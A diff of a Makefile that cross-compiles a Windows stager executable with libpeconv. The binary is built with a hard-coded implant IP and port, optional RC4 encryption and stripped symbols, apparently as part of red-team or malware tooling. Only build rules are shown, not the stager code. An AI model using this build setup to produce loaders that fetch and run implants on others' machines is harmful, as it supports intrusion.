@@ -4,9 +4,14 @@ obj_libpeconv = $(src_libpeconv:.cpp=.o)
 INC = -Ilibpeconv/libpeconv/include
 CFLAGS = -Wno-conversion-null -Wno-pointer-arith
 LDFLAGS = -lntdll -static
-LDFLAGS2 = -Ldist -l:libpeconv.a -lntdll -lws2_32 -static
+LDFLAGS2 = -Ldist -l:libpeconv.a -lws2_32
 # static linking is needed for cross compiling c++ to windows
 # TODO: solve it dynamically in order to reduce stager size
+
+CFLAG_RC4 = 
+ifdef RC4_KEY
+  CFLAG_RC4 = -DRC4_KEY=\"$(RC4_KEY)\"
+endif
 
 CXX_x32 := i686-w64-mingw32-g++
 CXX_x64 := x86_64-w64-mingw32-g++
@@ -19,12 +24,12 @@ check_defined = \
 __check_defined = \
     $(if $(value $1),, \
         $(error Undefined $1$(if $2, ($2))$(if $(value @), \
-                required by target `$@')))
+                required by target $@)))
 
 stager := dist/stager.exe
 
 .PHONY: all
-all: dist/libpeconv.a dist/stager.exe
+all: stager
 
 libpeconv/libpeconv/src/%.o: libpeconv/libpeconv/src/%.cpp
 	$(CXX_x64) -c $(INC) ${CFLAGS} $< -o $@
@@ -33,18 +38,24 @@ dist/libpeconv.a: $(obj_libpeconv)
 #	$(CXX_x64) -o dist/libpeconv.dll -shared $^ ${LDFLAGS}
 	${AR_x64} rcs dist/libpeconv.a $^
 
-.PHONY: stager
-stager:	$(stager)
+stager/cRC4.o:
+	$(CXX_x64) -c stager/cRC4.cpp -o stager/cRC4.o
 
-$(stager): dist/libpeconv.a
+stager/stager.o:
 	@:$(call check_defined, IMPLANT_IP, implant serving ip)
 	@:$(call check_defined, IMPLANT_PORT, implant serving port)
 
-	$(CXX_x64) stager/stager.cpp -o dist/stager.exe $(CFLAGS) $(INC) $(LDFLAGS2) -DIMPLANT_IP=\"$(IMPLANT_IP)\" -DIMPLANT_PORT=$(IMPLANT_PORT)
+	$(CXX_x64) -c stager/stager.cpp $(CFLAGS) $(INC) -DIMPLANT_IP=\"$(IMPLANT_IP)\" -DIMPLANT_PORT=$(IMPLANT_PORT) $(CFLAG_RC4) -o stager/stager.o
+
+.PHONY: stager
+stager:	$(stager)
+
+$(stager): stager/cRC4.o stager/stager.o dist/libpeconv.a
+	$(CXX_x64) stager/*.o $(LDFLAGS) $(LDFLAGS2) -s -o $(stager)
 
 .PHONY: clean
 clean:
-	rm -f dist/libpeconv.dll dist/libpeconv.a dist/stager.exe
+	rm -f dist/libpeconv.dll dist/libpeconv.a dist/stager.exe stager/cRC4.o stager/stager.o
 
 .PHONY: cleanall
 cleanall: clean
